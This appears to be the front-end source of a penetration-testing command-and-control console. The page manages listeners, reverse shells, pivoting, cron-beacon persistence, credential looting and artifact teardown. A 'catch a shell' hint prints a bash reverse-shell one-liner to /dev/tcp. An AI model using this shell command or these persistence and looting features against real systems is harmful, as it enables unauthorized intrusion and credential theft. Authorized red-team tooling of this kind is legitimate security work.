// Sessions — terminal-first C2 workspace. Narrow session list (grouped by host)
// on the left, a large live terminal on the right, and one tidy action toolbar
// of grouped menus (Run · Transfer · Pivot · Persist · Upgrade · Loot) above it.
// Replaces the old cramped split-pane + wall of ~15 buttons.
import { useEffect, useRef, useState } from "react";
import {
  SessionInfo, ListenerInfo, QuickAction, getSessions, getListeners, startListener,
  stopListener, getQuickActions, runQuickAction, runShellCmd, runEnum,
  downloadFromShell, uploadToShell, startTunnel, stopTunnel, tunnelStatus,
  startPortFwd, upgradeSession, lootCred, persistSession, getTeardown, TeardownInventory,
  removePersistence, removeAllPersistence, clearTeardownUpload, closeSession,
  TdPersistence, TdUpload, TdListener, TdSession, TdTunnel, TdPortfwd,
  getSessionTasks, TaskRow,
  Beacon, BeaconRegisterResponse, listBeacons, registerBeacon, deleteBeacon, patchBeacon,
} from "../api";
import { bytesToB64 } from "../util";
import { SectionProps } from "../nav";
import { Panel, Empty } from "../kit";
import { toast } from "../toast";
import { ShellTerminal } from "../sessions/Terminal";

export function Sessions({ nav }: SectionProps) {
  const [sessions, setSessions] = useState<SessionInfo[]>([]);
  const [listeners, setListeners] = useState<ListenerInfo[]>([]);
  const [selId, setSelId] = useState<string | null>(null);
  const [teardown, setTeardown] = useState<TeardownInventory | null>(null);

  useEffect(() => {
    const poll = () => { getSessions().then(setSessions).catch(() => {}); getListeners().then(setListeners).catch(() => {}); };
    poll(); const t = window.setInterval(poll, 4000); return () => window.clearInterval(t);
  }, []);
  useEffect(() => { if (sessions.length && !sessions.find((s) => s.id === selId)) setSelId(sessions[0].id); }, [sessions, selId]);

  const sel = sessions.find((s) => s.id === selId) || null;
  const byHost: Record<string, SessionInfo[]> = {};
  for (const s of sessions) (byHost[s.host_ip] ||= []).push(s);

  async function newListener() {
    try { const l = await startListener(4444, false); toast.show(`listener up on :${l.port}`); getListeners().then(setListeners); }
    catch { try { const l = await startListener(0, false); toast.show(`listener up on :${l.port}`); getListeners().then(setListeners); } catch (e) { toast.show(`listener failed: ${(e as Error).message}`); } }
  }

  return (
    <div className="sess-layout">
      {/* Left: listeners + session list */}
      <div className="sess-list">
        <Panel title="Listeners" actions={<button className="btn sm primary" onClick={newListener}>+ Start</button>}>
          {listeners.length === 0 ? <div className="muted" style={{ fontSize: 11 }}>No listeners. Start one, then point a reverse shell at your box.</div>
            : listeners.map((l) => (
              <div key={l.id} className="row" style={{ gap: 6, padding: "3px 0", fontSize: 12 }}>
                <span className={"sess-dot " + (l.status === "listening" ? "live" : "stale")} />
                <span className="mono">{l.host}:{l.port}</span><span className="faint">{l.kind}</span>
                <button className="linkish right" onClick={() => stopListener(l.id).then(() => getListeners().then(setListeners))}>stop</button>
              </div>
            ))}
          <details style={{ marginTop: 6 }}>
            <summary className="linkish" style={{ fontSize: 11 }}>catch a shell</summary>
            <pre className="out-panel" style={{ marginTop: 6 }}>{`bash -i >& /dev/tcp/<your-ip>/4444 0>&1`}</pre>
          </details>
        </Panel>

        <BeaconsPanel />

        <div>
          {Object.keys(byHost).length === 0 ? <div className="muted" style={{ fontSize: 12, padding: "8px 2px" }}>No shells yet.</div> :
            Object.entries(byHost).map(([host, ss]) => (
              <div key={host}>
                <div className="sess-grp-h">{host}</div>
                {ss.map((s) => (
                  <div key={s.id} className={"sess-item" + (s.id === selId ? " active" : "")} onClick={() => setSelId(s.id)}>
                    <span className={"sess-dot " + s.status} />
                    <span className="sess-name">{s.name || s.id.slice(0, 8)}</span>
                    {s.kind === "beacon" && <span className="chip" title="async beacon (polls in via /beacon/checkin)" style={{ fontSize: 9 }}>BEACON</span>}
                    {s.pty && <span className="chip" style={{ fontSize: 9 }}>PTY</span>}
                    {s.socks_port ? <span className="chip" title="SOCKS proxy up" style={{ fontSize: 9 }}>SOCKS</span> : null}
                  </div>
                ))}
              </div>
            ))}
        </div>
      </div>

      {/* Right: terminal workspace */}
      <div className="sess-work">
        {!sel ? (
          <Panel><Empty>No session selected. Start a listener and catch a reverse shell — it'll appear here.</Empty></Panel>
        ) : (
          <>
            <div className="sess-toolbar">
              <RunMenu session={sel} />
              <TransferMenu session={sel} />
              <PivotMenu session={sel} />
              <PersistMenu session={sel} onTeardown={() => getTeardown().then(setTeardown)} />
              <button className="btn sm" title="upgrade to a robust reconnecting PTY"
                      onClick={() => upgradeSession(sel.id).then((r) => toast.show(r.upgraded ? "PTY upgrade sent — reconnecting shell will land as a sibling" : (r.reason || "upgrade requested"))).catch((e) => toast.show(String(e)))}>⬆ Upgrade PTY</button>
              <LootMenu session={sel} />
              <button className="btn sm right" onClick={() => getTeardown().then(setTeardown)}>Teardown</button>
            </div>
            <div className="term-wrap"><ShellTerminal session={sel} tester={nav.tester} /></div>
            <TasksPanel session={sel} />
          </>
        )}
      </div>

      {teardown && <TeardownDrawer inv={teardown} onClose={() => setTeardown(null)} />}
    </div>
  );
}

// ---- Tasks panel (async-C2 P0 — read-only) ---------------------------------
// The task-record layer on the /task endpoint writes one row per dispatched
// command (queued -> done). This panel is the team-visible view of those rows
// for the selected session: signal-first grouped counts up top, most-recent
// list below, collapsed by default so it never fights the terminal for space.
// Polls every 4s; live SSE swap-in lands with the beacon transport in P1.
function TasksPanel({ session }: { session: SessionInfo }) {
  const [rows, setRows] = useState<TaskRow[]>([]);
  const [open, setOpen] = useState(false);
  const [selected, setSelected] = useState<TaskRow | null>(null);

  useEffect(() => {
    let cancel = false;
    const poll = () => {
      getSessionTasks(session.id, { limit: 50 })
        .then((r) => { if (!cancel) setRows(r.tasks || []); })
        .catch(() => {});
    };
    poll();
    const t = window.setInterval(poll, 4000);
    return () => { cancel = true; window.clearInterval(t); };
  }, [session.id]);

  // Signal-first counters — the whole point of a summary bar per
  // webui-ux-preferences (not a flat list).
  const counts = { queued: 0, done: 0, error: 0, other: 0 };
  for (const r of rows) {
    if (r.status === "queued" || r.status === "sent") counts.queued++;
    else if (r.status === "done" || r.status === "ok") counts.done++;
    else if (r.status === "error") counts.error++;
    else counts.other++;
  }

  return (
    <div className="tasks-panel" style={{ borderTop: "1px solid var(--line)",
                                          background: "var(--surface, transparent)" }}>
      <div className="row" style={{ gap: 10, padding: "6px 10px", alignItems: "center",
                                    cursor: "pointer", fontSize: 12 }}
           onClick={() => setOpen((v) => !v)}
           title="task-record: every command dispatched through this session">
        <span style={{ fontWeight: 600 }}>Tasks</span>
        <span className="chip" title="completed">{counts.done} done</span>
        {counts.queued > 0 && <span className="chip" style={{ color: "var(--warn)" }} title="in flight">{counts.queued} queued</span>}
        {counts.error > 0 && <span className="chip" style={{ color: "var(--err, #b00)" }} title="failed">{counts.error} error</span>}
        <span className="faint right" style={{ fontSize: 11 }}>{open ? "▾" : "▸"} {rows.length ? `${rows.length} total` : "none yet"}</span>
      </div>
      {open && (
        <div style={{ maxHeight: 240, overflowY: "auto", padding: "4px 10px 10px" }}>
          {rows.length === 0 ? (
            <div className="muted" style={{ fontSize: 12, padding: "8px 0" }}>
              No tasks yet. Use Run → Command, or fieldkit against this session, and rows will appear here.
            </div>
          ) : rows.map((r) => (
            <div key={r.task_id || (r.ts + r.command)}
                 className="row" style={{ gap: 8, padding: "3px 0", fontSize: 12, alignItems: "baseline",
                                          borderBottom: "1px solid color-mix(in srgb,var(--line) 40%,transparent)",
                                          cursor: r.output ? "pointer" : "default" }}
                 onClick={() => r.output && setSelected(r)}
                 title={r.output ? "click to view captured output" : ""}>
              <span className="chip" style={{ fontSize: 10,
                                              color: r.status === "error" ? "var(--err, #b00)"
                                                   : r.status === "queued" || r.status === "sent" ? "var(--warn)"
                                                   : undefined }}>
                {r.status}
              </span>
              <span className="mono" style={{ flex: 1, overflow: "hidden", textOverflow: "ellipsis", whiteSpace: "nowrap" }}>
                {r.command}
              </span>
              {r.attack && <span className="faint" style={{ fontSize: 10 }} title={r.attack}>{r.attack.split(" ")[0]}</span>}
              {r.bytes > 0 && <span className="faint" style={{ fontSize: 10 }}>{r.bytes}B</span>}
              <span className="faint" style={{ fontSize: 10 }}>{r.operator}</span>
            </div>
          ))}
        </div>
      )}
      {selected && (
        <div className="drawer-backdrop" onClick={() => setSelected(null)}>
          <div onClick={(e) => e.stopPropagation()}
               style={{ position: "fixed", inset: "10% 10%", background: "var(--bg)",
                        border: "1px solid var(--line)", borderRadius: 6, padding: 14,
                        display: "flex", flexDirection: "column", zIndex: 1000 }}>
            <div className="row" style={{ gap: 8, alignItems: "baseline", marginBottom: 8 }}>
              <span className="chip">{selected.status}</span>
              <span className="mono" style={{ fontWeight: 600 }}>{selected.command}</span>
              {selected.attack && <span className="chip">{selected.attack}</span>}
              <button className="btn sm right" onClick={() => setSelected(null)}>Close</button>
            </div>
            <pre className="out-panel" style={{ flex: 1, overflow: "auto", margin: 0 }}>{selected.output || "(no output)"}</pre>
            <div className="faint" style={{ fontSize: 11, marginTop: 6 }}>
              {selected.bytes}B · {selected.operator} · {selected.result_at ? `finished ${new Date(Number(selected.result_at) * 1000).toLocaleTimeString()}` : "still queued"}
            </div>
          </div>
        </div>
      )}
    </div>
  );
}

// --- popover menu -----------------------------------------------------------
function Menu({ label, children }: { label: string; children: React.ReactNode }) {
  const [open, setOpen] = useState(false);
  const ref = useRef<HTMLDivElement>(null);
  useEffect(() => {
    if (!open) return;
    const h = (e: MouseEvent) => { if (ref.current && !ref.current.contains(e.target as Node)) setOpen(false); };
    document.addEventListener("mousedown", h); return () => document.removeEventListener("mousedown", h);
  }, [open]);
  return (
    <div className="pop" ref={ref}>
      <button className="btn sm" onClick={() => setOpen((v) => !v)}>{label} ▾</button>
      {open && <div className="pop-panel">{children}</div>}
    </div>
  );
}

function RunMenu({ session }: { session: SessionInfo }) {
  const [qa, setQa] = useState<QuickAction[]>([]);
  const [cmd, setCmd] = useState("");
  const [out, setOut] = useState("");
  const [busy, setBusy] = useState(false);
  useEffect(() => { getQuickActions().then(setQa).catch(() => {}); }, []);
  const run = async (fn: () => Promise<{ output: string }>) => { setBusy(true); try { setOut((await fn()).output); } catch (e) { setOut(String(e)); } finally { setBusy(false); } };
  return (
    <Menu label="Run">
      <div className="row wrap" style={{ gap: 4, marginBottom: 8 }}>
        {qa.map((a) => <button key={a.key} className="btn sm" disabled={busy} onClick={() => run(() => runQuickAction(session.id, a.key))} title={a.cmd}>{a.label}</button>)}
      </div>
      <div className="row" style={{ gap: 6, marginBottom: 8 }}>
        <input className="fin" placeholder="run a command…" value={cmd} onChange={(e) => setCmd(e.target.value)}
               onKeyDown={(e) => { if (e.key === "Enter" && cmd.trim()) run(() => runShellCmd(session.id, cmd)); }} />
        <button className="btn sm" disabled={busy || !cmd.trim()} onClick={() => run(() => runShellCmd(session.id, cmd))}>Run</button>
      </div>
      <button className="btn sm" disabled={busy} onClick={() => { setBusy(true); runEnum(session.id).then((r) => { setOut(`enum queued (${r.bytes} bytes script)`); }).catch((e) => setOut(String(e))).finally(() => setBusy(false)); }}>Run on-target enum → ingest</button>
      {out && <pre className="out-panel" style={{ marginTop: 8 }}>{out}</pre>}
    </Menu>
  );
}

function TransferMenu({ session }: { session: SessionInfo }) {
  const [path, setPath] = useState("");
  const [upPath, setUpPath] = useState("");
  const fileRef = useRef<HTMLInputElement>(null);
  return (
    <Menu label="Transfer">
      <div className="field"><span className="fl">Download from target</span>
        <div className="row" style={{ gap: 6 }}>
          <input className="fin" placeholder="/etc/passwd" value={path} onChange={(e) => setPath(e.target.value)} />
          <button className="btn sm" disabled={!path.trim()} onClick={() => downloadFromShell(session.id, path).then((r) => toast.show(`saved ${r.saved} (${r.size} B)`)).catch((e) => toast.show(String(e)))}>Get</button>
        </div>
      </div>
      <div className="field"><span className="fl">Upload to target</span>
        <input className="fin" placeholder="remote path e.g. /tmp/x" value={upPath} onChange={(e) => setUpPath(e.target.value)} />
        <input ref={fileRef} type="file" style={{ marginTop: 6, fontSize: 11 }}
               onChange={async (e) => {
                 const f = e.target.files?.[0]; if (!f || !upPath.trim()) { toast.show("set a remote path first"); return; }
                 const b64 = bytesToB64(new Uint8Array(await f.arrayBuffer()));
                 uploadToShell(session.id, upPath, b64).then((r) => toast.show(`uploaded ${r.bytes} B`)).catch((er) => toast.show(String(er)));
               }} />
      </div>
    </Menu>
  );
}

function PivotMenu({ session }: { session: SessionInfo }) {
  const [socks, setSocks] = useState(1080);
  const [lport, setLp] = useState(0); const [rhost, setRh] = useState(""); const [rport, setRp] = useState(0);
  return (
    <Menu label="Pivot">
      <div className="field"><span className="fl">SOCKS5 tunnel</span>
        <div className="row" style={{ gap: 6 }}>
          <input className="fin" type="number" value={socks} onChange={(e) => setSocks(+e.target.value)} style={{ width: 90 }} />
          <button className="btn sm" onClick={() => startTunnel(session.id, socks).then((r) => toast.show(r.ok ? `SOCKS up on ${r.socks_addr}` : (r.reason || "failed"))).catch((e) => toast.show(String(e)))}>Start</button>
          <button className="btn sm" onClick={() => stopTunnel(session.id).then(() => toast.show("tunnel stopped"))}>Stop</button>
          <button className="btn sm" onClick={() => tunnelStatus(session.id).then((s) => toast.show(s.active ? `SOCKS :${s.socks_port}` : "no tunnel"))}>Status</button>
        </div>
      </div>
      <div className="field"><span className="fl">Port-forward (local → target-internal)</span>
        <div className="row" style={{ gap: 6 }}>
          <input className="fin" type="number" placeholder="lport" value={lport || ""} onChange={(e) => setLp(+e.target.value)} style={{ width: 70 }} />
          <input className="fin" placeholder="rhost" value={rhost} onChange={(e) => setRh(e.target.value)} />
          <input className="fin" type="number" placeholder="rport" value={rport || ""} onChange={(e) => setRp(+e.target.value)} style={{ width: 70 }} />
          <button className="btn sm" disabled={!lport || !rhost || !rport} onClick={() => startPortFwd(session.id, lport, rhost, rport).then((r) => toast.show(r.ok ? `forwarding :${lport} → ${rhost}:${rport}` : (r.reason || "failed"))).catch((e) => toast.show(String(e)))}>Add</button>
        </div>
      </div>
    </Menu>
  );
}

function PersistMenu({ session, onTeardown }: { session: SessionInfo; onTeardown: () => void }) {
  const [armed, setArmed] = useState(false);
  const install = () => {
    persistSession(session.id)
      .then((r) => toast.show(r.ok ? "beacon installed (tracked in Teardown)" : (r.reason || "failed")))
      .catch((e) => toast.show(String(e)))
      .finally(() => setArmed(false));
  };
  return (
    <Menu label="Persist">
      <div className="muted" style={{ fontSize: 11, marginBottom: 8 }}>Installs a tracked cron beacon (INTRUSIVE). Removable from Teardown.</div>
      {!armed
        ? <button className="btn sm danger" onClick={() => setArmed(true)}>Install beacon</button>
        : <span className="row" style={{ gap: 6, alignItems: "center" }}>
            <span style={{ fontSize: 11, color: "var(--warn)", fontWeight: 600 }}>intrusive — are you sure?</span>
            <button className="btn sm danger" onClick={install}>Yes, install</button>
            <button className="btn sm" onClick={() => setArmed(false)}>Cancel</button>
          </span>}
      <button className="btn sm" style={{ marginLeft: 6 }} onClick={onTeardown}>Open Teardown</button>
    </Menu>
  );
}

function LootMenu({ session }: { session: SessionInfo }) {
  const [u, setU] = useState(""); const [s, setS] = useState(""); const [k, setK] = useState("password");
  return (
    <Menu label="Loot">
      <div className="field"><span className="fl">Record a captured credential</span>
        <input className="fin" placeholder="username" value={u} onChange={(e) => setU(e.target.value)} style={{ marginBottom: 6 }} />
        <input className="fin" placeholder="secret / hash" value={s} onChange={(e) => setS(e.target.value)} style={{ marginBottom: 6 }} />
        <div className="row" style={{ gap: 6 }}>
          <select className="fin" value={k} onChange={(e) => setK(e.target.value)} style={{ maxWidth: 130 }}>
            <option value="password">password</option><option value="nthash">nthash</option><option value="ssh-key">ssh-key</option>
          </select>
          <button className="btn sm primary" disabled={!u || !s} onClick={() => lootCred(session.id, { username: u, secret: s, kind: k }).then(() => { toast.show("credential recorded"); setU(""); setS(""); }).catch((e) => toast.show(String(e)))}>Add</button>
        </div>
      </div>
    </Menu>
  );
}

function TeardownDrawer({ inv, onClose }: { inv: TeardownInventory; onClose: () => void }) {
  const [busy, setBusy] = useState<string | null>(null);
  const [local, setLocal] = useState(inv);
  const reload = () => getTeardown().then(setLocal).catch(() => {});

  const act = async (id: string, fn: () => Promise<unknown>, label: string) => {
    setBusy(id);
    try { await fn(); toast.show(label); reload(); }
    catch (e) { toast.show(String(e)); }
    finally { setBusy(null); }
  };

  const removeAllPers = () => act("pers-all", async () => {
    const r = await removeAllPersistence();
    if (r.failed.length) toast.show(`${r.failed.length} failed to remove`);
  }, "persistence removal sent");

  const ROW: React.CSSProperties = { fontSize: 11, padding: "4px 0", borderBottom: "1px solid color-mix(in srgb,var(--line) 55%,transparent)", display: "flex", alignItems: "center", gap: 8 };

  return (
    <>
      <div className="drawer-backdrop" onClick={onClose} />
      <aside className="drawer" role="dialog" aria-label="teardown">
        <div className="drawer-head"><div style={{ fontWeight: 700 }}>Teardown · {local.total} artifacts</div><button className="icon-btn" onClick={onClose}>✕</button></div>
        <div className="drawer-body">
          <div className="muted" style={{ marginBottom: 10 }}>Everything recce deployed this engagement. Remove each artifact before you leave the network.</div>

          {/* Persistence */}
          <div style={{ marginBottom: 14 }}>
            <div className="row" style={{ justifyContent: "space-between", alignItems: "center" }}>
              <h4 className="drawer-h">Persistence ({local.persistence.length})</h4>
              {local.persistence.length > 1 && <button className="btn sm danger" disabled={!!busy} onClick={removeAllPers}>Remove all</button>}
            </div>
            {local.persistence.length === 0 ? <div className="muted" style={{ fontSize: 12 }}>none</div> :
              local.persistence.map((p: TdPersistence) => (
                <div key={p.id} style={ROW}>
                  <span className="mono" style={{ flex: 1 }}>{p.host_ip} <span className="faint">· {p.mechanism} · {p.artifact_path}</span></span>
                  <button className="btn sm danger" disabled={busy === p.id} onClick={() => act(p.id, () => removePersistence(p.id), `removal sent for ${p.host_ip}`)}>Remove</button>
                </div>
              ))}
          </div>

          {/* Uploads */}
          <div style={{ marginBottom: 14 }}>
            <h4 className="drawer-h">Uploads ({local.uploads.length})</h4>
            {local.uploads.length === 0 ? <div className="muted" style={{ fontSize: 12 }}>none</div> :
              local.uploads.map((u: TdUpload) => (
                <div key={u.id} style={ROW}>
                  <span className="mono" style={{ flex: 1 }}>{u.host_ip}:{u.remote_path} <span className="faint">· {u.bytes || 0} B</span></span>
                  <button className="btn sm" disabled={busy === u.id} onClick={() => act(u.id, () => clearTeardownUpload(u.id), `marked ${u.remote_path} cleared`)}>Mark cleared</button>
                </div>
              ))}
          </div>

          {/* Listeners */}
          <div style={{ marginBottom: 14 }}>
            <h4 className="drawer-h">Listeners ({local.listeners.length})</h4>
            {local.listeners.length === 0 ? <div className="muted" style={{ fontSize: 12 }}>none</div> :
              local.listeners.map((l: TdListener) => (
                <div key={l.id} style={ROW}>
                  <span className="mono" style={{ flex: 1 }}>:{l.port} <span className="faint">· {l.kind}</span></span>
                  <button className="btn sm" disabled={busy === l.id} onClick={() => act(l.id, () => stopListener(l.id), `listener :${l.port} stopped`)}>Stop</button>
                </div>
              ))}
          </div>

          {/* Tunnels */}
          <div style={{ marginBottom: 14 }}>
            <h4 className="drawer-h">Tunnels ({local.tunnels.length})</h4>
            {local.tunnels.length === 0 ? <div className="muted" style={{ fontSize: 12 }}>none</div> :
              local.tunnels.map((t: TdTunnel) => (
                <div key={t.session_id} style={ROW}>
                  <span className="mono" style={{ flex: 1 }}>{t.host_ip} <span className="faint">· SOCKS :{t.socks_port}</span></span>
                  <button className="btn sm" disabled={busy === t.session_id} onClick={() => act(t.session_id, () => stopTunnel(t.session_id), `tunnel to ${t.host_ip} stopped`)}>Stop</button>
                </div>
              ))}
          </div>

          {/* Port-forwards */}
          <div style={{ marginBottom: 14 }}>
            <h4 className="drawer-h">Port-forwards ({local.portfwds.length})</h4>
            {local.portfwds.length === 0 ? <div className="muted" style={{ fontSize: 12 }}>none</div> :
              local.portfwds.map((pf: TdPortfwd, i: number) => (
                <div key={i} style={ROW}>
                  <span className="mono" style={{ flex: 1 }}>:{pf.lport} → {pf.rhost}:{pf.rport} <span className="faint">· {pf.host_ip || pf.session_id?.slice(0, 8)}</span></span>
                </div>
              ))}
          </div>

          {/* Sessions */}
          <div style={{ marginBottom: 14 }}>
            <h4 className="drawer-h">Sessions ({local.sessions.length})</h4>
            {local.sessions.length === 0 ? <div className="muted" style={{ fontSize: 12 }}>none</div> :
              local.sessions.map((s: TdSession) => (
                <div key={s.id} style={ROW}>
                  <span className="mono" style={{ flex: 1 }}>{s.host_ip} <span className="faint">· {s.name || s.id.slice(0, 8)} · {s.kind}{s.pty ? " (PTY)" : ""}</span></span>
                  <button className="btn sm" disabled={busy === s.id} onClick={() => act(s.id, () => closeSession(s.id), `session ${s.name || s.id.slice(0, 8)} closed`)}>Close</button>
                </div>
              ))}
          </div>
        </div>
      </aside>
    </>
  );
}

// ---- Beacons panel (async-C2 P1) -------------------------------------------
// Async beacons live alongside listeners in the left column. Register spawns
// a new beacon-mode session; the RAW PSK is shown ONCE — the operator must
// copy it before dismissing (no server-side recovery — same trust model as
// the reverse-shell tokens).
function BeaconsPanel() {
  const [beacons, setBeacons] = useState<Beacon[]>([]);
  const [showRegister, setShowRegister] = useState(false);
  const [justRegistered, setJustRegistered] = useState<BeaconRegisterResponse | null>(null);

  const reload = () => { listBeacons().then((r) => setBeacons(r.beacons || [])).catch(() => {}); };
  useEffect(() => {
    reload();
    const t = window.setInterval(reload, 4000);
    return () => window.clearInterval(t);
  }, []);

  const doRetire = (bid: string, hint: string) => {
    if (!confirm(`Retire beacon ${hint}? The task+transcript history is kept.`)) return;
    deleteBeacon(bid).then(() => { toast.show("beacon retired"); reload(); })
                     .catch((e) => toast.show(String(e)));
  };

  return (
    <>
      <Panel title="Beacons"
             actions={<button className="btn sm primary" onClick={() => setShowRegister(true)}>+ Register</button>}>
        {beacons.length === 0 ? (
          <div className="muted" style={{ fontSize: 11 }}>
            No beacons. Register one, then have your target-side agent POST to
            <code style={{ margin: "0 3px" }}>/beacon/checkin</code> with the PSK.
          </div>
        ) : beacons.map((b) => (
          <BeaconRow key={b.id} b={b} onReload={reload}
                     onRetire={() => doRetire(b.id, b.id.slice(0, 8))} />
        ))}
      </Panel>
      {showRegister && (
        <RegisterBeaconDrawer onClose={() => setShowRegister(false)}
          onRegistered={(js) => { setJustRegistered(js); setShowRegister(false); reload(); }} />
      )}
      {justRegistered && (
        <PskShownOnceModal r={justRegistered} onClose={() => setJustRegistered(null)} />
      )}
    </>
  );
}

function BeaconRow({ b, onRetire, onReload }: { b: Beacon; onRetire: () => void; onReload: () => void }) {
  const [editing, setEditing] = useState(false);
  const [sleep, setSleep] = useState(String(b.sleep_s));
  const [jitter, setJitter] = useState(String(b.jitter_pct));
  const stale = b.last_checkin > 0 && (Date.now() / 1000 - b.last_checkin) > b.sleep_s * 3;
  const dot = b.last_checkin === 0 ? "stale" : (stale ? "stale" : "live");
  const seen = b.last_checkin === 0 ? "never seen"
    : `seen ${Math.max(0, Math.round(Date.now() / 1000 - b.last_checkin))}s ago`;
  const save = () => {
    const body: { sleep_s?: number; jitter_pct?: number } = {};
    const s = Number(sleep), j = Number(jitter);
    if (!isNaN(s) && s !== b.sleep_s) body.sleep_s = s;
    if (!isNaN(j) && j !== b.jitter_pct) body.jitter_pct = j;
    if (Object.keys(body).length === 0) { setEditing(false); return; }
    patchBeacon(b.id, body).then(() => { toast.show("beacon policy updated"); setEditing(false); onReload(); })
      .catch((e) => toast.show(String(e)));
  };
  return (
    <div style={{ padding: "4px 0", borderBottom: "1px solid color-mix(in srgb,var(--line) 40%,transparent)" }}>
      <div className="row" style={{ gap: 6, alignItems: "center", fontSize: 12 }}>
        <span className={"sess-dot " + dot} />
        <span className="mono" title={b.id}>{b.id.slice(0, 8)}</span>
        <span className="faint">{b.transport}</span>
        {!editing && (
          <span className="faint" style={{ fontSize: 11 }}>
            {b.sleep_s}s ±{b.jitter_pct}%
          </span>
        )}
        <button className="linkish right" onClick={onRetire} title="retire — history kept">retire</button>
        {!editing && (
          <button className="linkish" style={{ marginRight: 6 }} onClick={() => setEditing(true)}>edit</button>
        )}
      </div>
      {editing ? (
        <div className="row" style={{ gap: 4, marginTop: 4, fontSize: 11, alignItems: "center" }}>
          <span className="faint">sleep</span>
          <input className="fin" type="number" min={1} max={3600} value={sleep} onChange={(e) => setSleep(e.target.value)}
                 style={{ width: 60, padding: "2px 4px" }} />
          <span className="faint">jitter %</span>
          <input className="fin" type="number" min={0} max={100} value={jitter} onChange={(e) => setJitter(e.target.value)}
                 style={{ width: 50, padding: "2px 4px" }} />
          <button className="btn sm primary" onClick={save}>save</button>
          <button className="btn sm" onClick={() => { setSleep(String(b.sleep_s)); setJitter(String(b.jitter_pct)); setEditing(false); }}>cancel</button>
        </div>
      ) : (
        <div className="faint" style={{ fontSize: 10, marginLeft: 14 }}>{seen}{b.notes ? ` · ${b.notes}` : ""}</div>
      )}
    </div>
  );
}

function RegisterBeaconDrawer({ onClose, onRegistered }:
  { onClose: () => void; onRegistered: (js: BeaconRegisterResponse) => void }) {
  const [host, setHost] = useState("");
  const [sleep, setSleep] = useState("30");
  const [jitter, setJitter] = useState("20");
  const [notes, setNotes] = useState("");
  const [busy, setBusy] = useState(false);
  const submit = () => {
    if (!host.trim()) { toast.show("host_ip required"); return; }
    setBusy(true);
    registerBeacon({ host_ip: host.trim(),
                     sleep_s: Number(sleep) || 30,
                     jitter_pct: Number(jitter) || 20,
                     notes: notes.trim() })
      .then(onRegistered)
      .catch((e) => toast.show(String(e)))
      .finally(() => setBusy(false));
  };
  return (
    <>
      <div className="drawer-backdrop" onClick={onClose} />
      <aside className="drawer" role="dialog" aria-label="register beacon" onKeyDown={(e) => { if (e.key === "Escape") onClose(); }}>
        <div className="drawer-head">
          <div>
            <div style={{ fontWeight: 700, fontSize: 15 }}>Register a beacon</div>
            <div className="muted" style={{ fontSize: 12 }}>The PSK will appear once — copy it before dismissing.</div>
          </div>
          <button className="icon-btn" onClick={onClose} title="close (Esc)">✕</button>
        </div>
        <div className="drawer-body">
          <label className="field"><span className="fl">host_ip</span>
            <input className="fin" value={host} onChange={(e) => setHost(e.target.value)} placeholder="10.0.0.5" autoFocus />
          </label>
          <div className="row" style={{ gap: 8 }}>
            <label className="field" style={{ flex: 1 }}><span className="fl">sleep (s)</span>
              <input className="fin" type="number" min={1} max={3600} value={sleep} onChange={(e) => setSleep(e.target.value)} />
            </label>
            <label className="field" style={{ flex: 1 }}><span className="fl">jitter %</span>
              <input className="fin" type="number" min={0} max={100} value={jitter} onChange={(e) => setJitter(e.target.value)} />
            </label>
          </div>
          <label className="field"><span className="fl">notes (optional)</span>
            <textarea className="fin" rows={2} value={notes} onChange={(e) => setNotes(e.target.value)}
                      placeholder="e.g. lab-dc01, test target for smoke run" />
          </label>
          <div className="row" style={{ gap: 8, marginTop: 12 }}>
            <button className="btn primary" disabled={busy} onClick={submit}>{busy ? "Registering…" : "Register"}</button>
            <button className="btn" onClick={onClose}>Cancel</button>
          </div>
        </div>
      </aside>
    </>
  );
}

function PskShownOnceModal({ r, onClose }: { r: BeaconRegisterResponse; onClose: () => void }) {
  const [copied, setCopied] = useState(false);
  const copy = () => {
    navigator.clipboard?.writeText(r.psk).then(() => setCopied(true)).catch(() => {});
  };
  return (
    <div className="drawer-backdrop" onClick={onClose}>
      <div onClick={(e) => e.stopPropagation()}
           style={{ position: "fixed", inset: "15% 15%", background: "var(--bg)",
                    border: "1px solid var(--line)", borderRadius: 8, padding: 20,
                    display: "flex", flexDirection: "column", gap: 12, zIndex: 1000 }}>
        <div>
          <div style={{ fontWeight: 700, fontSize: 16 }}>Beacon registered</div>
          <div className="muted" style={{ fontSize: 12 }}>
            id <span className="mono">{r.id.slice(0, 12)}…</span> on {r.host_ip} · {r.transport} · {r.sleep_s}s ±{r.jitter_pct}%
          </div>
        </div>
        <div style={{ padding: 10, border: "1px solid var(--warn, #b45309)", borderRadius: 6,
                       background: "color-mix(in srgb, var(--warn, #b45309) 8%, transparent)" }}>
          <div style={{ fontWeight: 600, marginBottom: 4, fontSize: 12 }}>
            ⚠ Pre-shared key — shown ONCE
          </div>
          <div className="mono" style={{ fontSize: 13, wordBreak: "break-all", padding: "6px 0" }}>{r.psk}</div>
          <button className="btn sm primary" onClick={copy}>{copied ? "✓ copied" : "Copy PSK"}</button>
        </div>
        <div className="muted" style={{ fontSize: 12 }}>
          The client HMACs each check-in with this key: <br />
          <code>X-Beacon-Mac = hmac_sha256(psk, f"{"{id}:{ts}:"}".encode() + body).hexdigest()</code>
        </div>
        <div className="row" style={{ justifyContent: "flex-end" }}>
          <button className="btn" onClick={onClose}>Dismiss</button>
        </div>
      </div>
    </div>
  );
}
